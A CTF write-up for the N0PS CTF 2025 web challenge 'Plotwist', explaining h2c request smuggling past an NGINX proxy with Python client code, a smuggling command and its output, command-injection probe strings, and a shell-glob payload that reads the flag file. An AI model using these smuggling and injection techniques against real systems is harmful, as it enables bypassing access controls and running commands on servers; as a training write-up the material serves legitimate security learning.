---
title: "N0PS25: Writeup for Web/Plotwist"
date: 2025-06-04T11:09:15+01:00
tags: ["ctf", "write-up", "nops"]
author: "hxuu"
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "CTF write-up for Plotwist"
summary: "This writeup covers the solution to the **\"Plotwist\"** web challenge from N0PS CTF 2025, which involves bypassing NGINX access controls to reach a restricted API endpoint."
canonicalURL: ""
disableHLJS: false
disableShare: false
hideSummary: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
editPost:
    URL: "https://github.com/hxuu/content"
    Text: "Suggest Changes"
    appendFilePath: true
---

## Challenge Overview

* CTF: N0PS CTF 2025
* Challenge: Plotwist
* Category: Web Exploitation
* Points: 500 (1 solves)
* Description:

> You stand on the edge of your final test. One choice, one letter, will determine your fate and you must prove yourself worthy of the path you take. No more gray, you must choose a side : Light or dark.
>
> So time to ask jojo the question : which side of me are you?
>
> Choose carefully, for this moment will define who you truly are and remember, the hardest choices often lead to the greatest destiny.

* Authors: [Sto](https://linktr.ee/yourssto)
* Source code: NONE

[This challenge is an instance based challenge (source here after it's published)](https://nopsctf-casino.chals.io/login?next=%2F)

## TL;DR

This writeup covers the solution to the **"Plotwist"** web challenge from N0PS CTF 2025,
which involves bypassing NGINX access controls to reach a restricted API endpoint.

We exploit an **h2c smuggling** vulnerability by crafting an HTTP/2 cleartext request using a custom Python client.
This allows them to bypass the proxy and access `/api/noopsy`. The final step uses a clever
shell expansion trick to read the flag from a filtered shell environment.

## Initial Analysis

At a glance, this is **as minimalistic** as a web application could get. We've got a form
that we can write into, and two options to pick which 'person' to send this letter to:
either **lordhttp** or **noopsy.**

![showcase](/blog/images/n0ps25-web-plotwist.gif)

So **lordhttp lets us through**, whereas noopsy doesn't. Interesting~

## Task Analysis

Upon further exploration, I found **nothing else of interest**. The app is so simple: allow one request,
block the other. So it should be easy to know what we should do: **bypass the access control.**

Checking the response header of the requests, we see that the backend is behind
a [reverse proxy](https://www.youtube.com/watch?v=ozhe__GdWC8&t=4s&pp=ygUXd2hhdCBpcyBhIHJldmVyc2UgcHJveHk%3D), **NGINX**, specifically.
So he, might be the one dropping our request before it ever reaches the backend.

This **asymmetric behavior** suggests that the proxy (NGINX) and the backend may handle requests differently.

This could mean:

* The proxy is enforcing access controls or filtering certain paths/methods.
* The backend is more permissive, but it’s hidden behind NGINX.

If we can find a way to **bypass NGINX** and talk to the backend directly, we might access restricted functionality.

The only problem is: NGINX inspects everything, and once it sees a request to `/api/noopsy`,
it simply blocks it.

So is there a way to make NGINX stop looking?

As crazy as it seems, **yes, there is**. But before I talk about it, you need to know
how the web works.

### 1. How the Web Works

At a high level, we have three entities that usually interact:

* A browser that sends an HTTP request to an edge server.
* The edge server acts like a gatekeeper: it applies security filters and decides what gets passed to the backend.
* The backend processes the request and sends the response back to the edge server, which forwards it to you.

![how web works](/blog/images/2025-06-04-15-53-59.png)

Edge servers here are called **reverse proxies**, namely NGINX.

### 2. What is Request Smuggling?

To evade these proxies, you need to secretly and maliciously pass a request you're
not supposed to pass to the server. This is called *smuggling* a request.

These attacks however are hard to achieve (or maybe I got skill issues?). They require
a **timing effect** that makes NGINX process part of the request and leave the other part for the backend.

But what if we didn’t have to trick the proxy and could just smuggle a request **by design**?
Here's where **h2c upgrades** come into play. Let's investigate this further.

### 3. Request Smuggling Via HTTP/2 Cleartext (h2c)

|                                                                                                                                       |
| ------------------------------------------------------------------------------------------------------------------------------------- |
| ![h2c Smuggling: Request Smuggling Via HTTP/2 Cleartext (h2c)](/blog/images/2025-06-04-15-26-43.png) |
| Taken from [Jake Miller's](https://bishopfox.com/blog/h2c-smuggling-request) research. Big thanks for making this information public. |

To understand this vulnerability, we need to grasp a few core ideas about
the underlying technology that powers web communication.

#### `3.1. TCP`

HTTP, aka hyper text transfer protocol is just that: a protocol, ie a way
to structure data to the end consumer. That data is transmitted via another protocol: **TCP**.

TCP transfers byte-encoded HTTP data over the wire. It doesn’t understand HTTP, just raw binary (0s and 1s).

A proxy that can interpret HTTP is **Layer 7-aware**. One that only sees TCP is **Layer 4-aware**.
Layer 4 proxies can’t comprehend URLs, paths, or HTTP headers—just bytes.

#### `3.2. The Upgrade Header`

You’ve probably heard of **WebSockets**, the real-time protocol that enables
instant communication between backend and client. To use WebSockets, we must **upgrade** an HTTP connection to a raw TCP connection.

We do that with an `Upgrade: websocket` header, which tells the proxy:
"I’ll be talking fast, stop inspecting things deeply—just pass along the bytes."


#### `3.2. Proxy Behavior on Protocol Upgrade`

Turns out, **some proxies disable security checks completely** once a connection is upgraded.
They no longer inspect traffic at Layer 7, losing the ability to enforce access controls.

---

While we don’t want to send WebSocket data, we **can upgrade** to HTTP/2 over cleartext (`h2c`),
a newer revision of HTTP/1.1 that achieves the same bypass, **without encryption** and while dodging access control.

> You can read more about the vulnerability [here](https://bishopfox.com/blog/h2c-smuggling-request)


## Exploitation

Armed with this new knowledge, we exploit the vulnerability like so:

1. First, create a TCP connection and send an HTTP/2 upgrade header: `Upgrade: h2c`
2. After the server responds with a `101 Switching Protocols`, we use the now-unmonitored TCP connection
   to send HTTP/2 requests directly to the target, **bypassing NGINX.**

Unfortunately, h2c upgrades **don’t work over TLS** (the challenge uses `https://` btw), so tools like `curl` won’t help,
they will reject the upgrade as it contradicts the sepc.

To get around this, we'll have to create our own client using Python's [hyper-h2](https://python-hyper.org/projects/hyper-h2/en/stable/) library. I'll show you how.

> Note: The following code is heavily inspired by BishopFox’s [`h2csmuggler.py`](https://github.com/minight/h2csmuggler).
> All credit to [Jake Miller](https://bishopfox.com/blog/h2c-smuggling-request). I’m just explaining it in my own way.


### Building the Client

#### `1. Creating the TCP Connection`

```python
import socket

def create_tcp_connection(proxy_url):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    context = ssl.create_default_context()
    context.check_hostname = False

    retSock = context.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLS)
    retSock.connect((proxy_url.hostname, 443))

    return retSock
```

#### `2. Sending the Initial HTTP/1.1 Request`


```python
def send_initial_request(connection, proxy_url):
    path = proxy_url.path or "/"

    request = (
        b"GET " + path.encode('utf-8') + b" HTTP/1.1\r\n" +
        b"Host: " + proxy_url.hostname.encode('utf-8') + b"\r\n" +
        b"Accept: */*\r\n" +
        b"Accept-Language: en\r\n" +
        b"Upgrade: h2c\r\n" +
        b"HTTP2-Settings: " + b"AAMAAABkAARAAAAAAAIAAAAA" + b"\r\n" +
        b"Connection: Upgrade, HTTP2-Settings\r\n" +
        b"\r\n"
    )
    connection.sendall(request)
```

* The `HTTP2-Settings` headers defines the terms by which client and server communicate (max concurrent streams...etc).
* `Connection: Upgrade, HTTP2-Settings` tells the server that the request wants to upgrade to HTTP/2 and that it
wants to use the HTTP2-Settings for upgrade negotiation.

#### `3. Creating H2 Connection Object & Sending Smuggled Request`

Assuming the latter request gave a `101 Switching Protocols` status code. Let's now
send our HTTP/2 requests.

---

HTTP/2 is a binary framed protocol. In simple terms, it doesn't depend on raw text
data like Http/1.x do (\r\n to be precise). So data is encapsulated in clear binary
format. The object that handles this encapsulation is `H2Connection`.

It’s like a translator: you tell it what you want to say (e.g., send a request), and it gives you raw bytes to send over the wire.

```python
import h2.connection

# This doesn't create a network connection
# h2_connection only gives binary data that WE OURSELVES send through the original tcp connection
h2_connection = h2.connection.H2Connection()

def sendSmuggledRequest(h2_connection, connection, args):
    stream_id = h2_connection.get_next_available_stream_id()

    smuggled_request_headers = [
        (':method', 'GET'),
        (':scheme', 'http'),
        (':authority', 'localhost'),
        (':path', '/api/noopsy'), # the bypassed path
    ]
    # Prepare the headers from python's format into binary format
    h2_connection.send_headers(stream_id, smuggled_request_headers)

    # Actually send the data
    connection.sendall(h2_connection.data_to_send())
```

Now that we sent the HTTP/2 request, we need to receive the response.

When you communicate over HTTP/2 using the h2 library, the server sends data and signals as part of the protocol,
which might include things like:

* Incoming requests
* Responses
* Stream lifecycle changes
* Flow control updates
* Server push notifications
* And more...

The h2 library abstracts these incoming signals into **“events.”**

To handle those "events", we have to receive raw data from the network and process it
as follows:

```python
# get the data using socket.recv()
events = getData(h2_connection, connection)

def handle_events(events, isVerbose):
    for event in events:
        if isinstance(event, ResponseReceived):
            # Handle response headers
            for name, value in event.headers:
                print(f"{name.decode('utf-8')}: {value.decode('utf-8')}")
        elif isinstance(event, DataReceived):
            # Handle response body data
            print(event.data.decode('utf-8', 'replace'))
```

### Combining Everything Together

Now that we know how [Jake Miller's](bishopfox.com/blog/h2c-smuggling-request) PoC works, we can use it to bypass nginx's
access controls as follows:

```bash
python3 h2csmuggler.py -x "https://nopsctf-<INSTANCE_ID>-plotwist-1.chals.io/api/lordhttp" "http://localhost/api/noopsy"
```
Where:

* `-x, --proxy PROXY` is the proxy server to try to bypass
* `http://localhost/api/noopsy` is the smuggled URL

The command as it is will send a GET request to `/api/lordhttp` and `/api/noopsy`,
but the application accepts POST requests to both, does it accept GET requests? Let's try:

> We could've send some OPTIONS/HEAD methods to verify that the server actually
> sends an `allow: GET` header, but testing it this way is faster.

```bash
h2csmuggler on  master [!] via 🐹 via 🐍 v3.13.3
➜ python3 h2csmuggler.py -x "https://nopsctf-dcdefb599276-plotwist-1.chals.io/api/lordhttp" "http://localhost/api/noopsy"

[INFO] h2c stream established successfully.
:status: 200
content-length: 46
content-type: application/json
date: Wed, 04 Jun 2025 13:12:22 GMT
server: hypercorn-h2

{"msg":"Hello from the other side, Lord HTTP"}

nopsctf-dcdefb599276-plotwist-1.chals.io/api/lordhttp - 200 - 46
[INFO] Requesting - /api/noopsy
:status: 200
content-length: 100
content-type: application/json
date: Wed, 04 Jun 2025 13:12:23 GMT
server: hypercorn-h2

{"msg":"Got a secret, can you keep it? Well this one, I'll save it in the secret_flag.txt file ^.^"}

localhost/api/noopsy - 200 - 100
```

There we go~ Sto is kind enough to save the flag in a `secret_flag.txt` file, all
we have to do is read that flag!

### Getting the Flag (or so I Think?)

We now know `/api/noopsy` accepts **POST** requests. We test for [command injection](https://portswigger.net/web-security/os-command-injection) using:

* `; whoami`
* `| id`
* `&& uname -a`
* `$(id)`

But... Nothing worked :(

The server responds with a **riddle**.

![sto riddle](/blog/images/2025-06-04-14-21-05.png)

Let’s decode it:

1. Money -> This could mean `$`, which can refer to environment variables
2. Talk in dollars or digits, or don’t even try -> allowed characters are `$`, `[0-9]`
3. Got a question? I’ll answer you away -> maybe even `?` is allowed?

Mhmmm, how can we read a file using only those character: `$`, `[0-9]` and `?`

---

It turns out, there is quite a creative way to solve this, but it all depends on the
same concept: [shell expansion](https://www.gnu.org/software/bash/manual/html_node/Shell-Expansions.html)

### Shell Expansion (the Real Deal)

When you're working in your shell, and type something like: `rm *`, you might think
that the `rm` command treats the character `*` differently and removes every file
in the current directory. However, you'd be wrong!

Your shell **expands** `*` and replaces it with every file inside the current directory,
so something like:

```bash
rm *
```

becomes:

```bash
rm file1 file2 file3...etc
```

BEFORE the command executes.

We can use this trick to execute commands AND supply filenames without needing to actually
type letters in the terminal. More specifically, we can do this:

```bash
$0 ???????????????
```

Where:

* `$0` -> holds the name of the script or command being executed. The one I'm **TRUSTING**
will give the flag based on the phrase: ***"I’ll answer you away"***
* `?` matches exactly one character -> 15 of them match `secret_flag.txt`

Putting this all together (with some grep magic of course), we end up with:

```bash
➜ python3 h2csmuggler.py -x "https://nopsctf-dcdefb599276-plotwist-1.chals.io/api/lordhttp" -XPOST -d '{"letter": "$0 ???????????????"}' "http://localhost/api/noopsy" | grep -oP N0PS{.*?}
N0PS{4nD_I_FE3l_50m37h1nG_5o_wR0nG_d01nG_7h3_r18h7_7h1nG}
```

Flag is: `N0PS{4nD_I_FE3l_50m37h1nG_5o_wR0nG_d01nG_7h3_r18h7_7h1nG}`

![primeagen](https://media1.tenor.com/m/hYU0XdvEzmAAAAAC/theprimeagen-primeagen.gif)

## Conclusions

* The challenge exploited an h2c (HTTP/2 cleartext) request smuggling vulnerability to bypass NGINX access controls.
* HTTP/2 upgrade allowed sending unfiltered requests directly to the backend, circumventing proxy restrictions.
* Custom Python client using `hyper-h2` was needed due to limitations with standard HTTP/2 tools over TLS.
* The flag retrieval required understanding shell expansion and limited input filtering to craft a valid command injection payload.
* The writeup highlights the importance of protocol-level nuances in web security and proxy behavior.

## References

1. **Bishop Fox – H2C Smuggling Explained**
    * Blog post: [H2C Smuggling Request](https://bishopfox.com/blog/h2c-smuggling-request)
    * Video explainer: [YouTube: "Smuggling HTTP Requests with H2C"](https://www.youtube.com/watch?v=PFllH0QccCs)

2. **RFC 7540 – HTTP/2 Specification**
    * Multiplexing and stream behavior: [RFC 7540 §5 – Streams and Multiplexing](https://datatracker.ietf.org/doc/html/rfc7540#section-5)

3. **H2C Upgrade Mechanics**

   * Video: [YouTube: "H2C Cleartext HTTP/2 Exploits"](https://www.youtube.com/watch?v=TOm3bFKotbU)
   * Python library docs: [hyper-h2 Usage Guide](https://python-hyper.org/projects/hyper-h2/en/stable/basic-usage.html)
   * Shows how to manually craft and send HTTP/2 requests over cleartext using `hyper-h2`, since standard clients like `curl` block such behavior due to spec violations.

4. [**Transport Layer Security, TLS 1.2 and 1.3 (Explained by Example)**](https://www.youtube.com/watch?v=AlE5X1NlHgg&list=PLQnljOFTspQW4yHuqp_Opv853-G_wAiH-)

